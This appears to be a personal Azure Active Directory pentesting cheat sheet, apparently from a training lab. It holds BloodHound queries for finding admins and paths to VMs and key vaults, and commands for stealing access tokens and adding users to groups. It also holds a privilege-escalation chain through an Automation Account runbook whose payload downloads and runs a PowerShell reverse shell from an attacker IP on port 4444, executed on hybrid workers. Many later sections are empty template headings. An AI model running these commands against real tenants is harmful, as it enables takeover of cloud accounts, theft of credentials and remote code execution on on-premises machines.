#### Find all users who have the Global Administrator role
```
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
```

#### Find all paths to an Azure VM
```
MATCH p = (n)-[r]->(g: AZVM) RETURN p
```

#### Find all paths to an Azure KeyVault
```
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

#### Find all paths to an Azure Resource Group
```
MATCH p = (n)-[r]->(g:AZResourceGroup) RETURN p
```

#### Find Owners of Azure Groups
```
MATCH p = (n)-[r:AZOwns]->(g:AZGroup) RETURN p
```

# Privilege escalation
#### List all owned objects
```
az ad signed-in-user list-owned-objects
```

#### Add a user to a group
```
Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
```

## Automation account
- Automation Account comes very handy in privilege escalation:
– Run As account is by default contributor on the current subscription and possible to have contributor permissions on other subscriptions in the tenant.   
– Often, clear-text privileges can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use PSRemoting. 
– Access to connections, key vaults from a runbook. 
– Ability to run commands on on-prem VMs if hybrid workers are in use.
– Ability to run commands on VMs using DSC in configuration management.

#### Get information on automation accounts
```
az extension add --upgrade -n automation
az automation account list
```

### Get the tokens to use Az Powershell
```
az account get-access-token
az account get-access-token --resource-type aad-graph

$accesstoken = ''
$aadtoken = ''

Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -AccountId <ID>
```

#### Get the role assigned of the automation accounts
- Check for the Roledefinitionn
```
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
```

#### Check if a hybrid worker is in use by the automation account
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```

#### Import Powershell runbook
```
Import-AzAutomationRunbook -Name student38 -Path C:\AzAD\Tools\student38.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```

#### Contents op studentx.ps1 for reverse shell
```
IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Invoke-PowerShellTcp.ps1")

reverse -Reverse -IPAddress 172.16.150.38 -Port 4444
```

#### Publish the automation runbook to the vm
```
Publish-AzAutomationRunbook -RunbookName student38 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

#### Start the runbook
```
Start-AzAutomationRunbook -RunbookName student38 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```
# Lateral movement
####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

# Persistent techniques
####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

# Data mining
####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

# Defenses
####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

# Bypassing defenses
####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

# Example title
## Second title
#### Command title
```

```

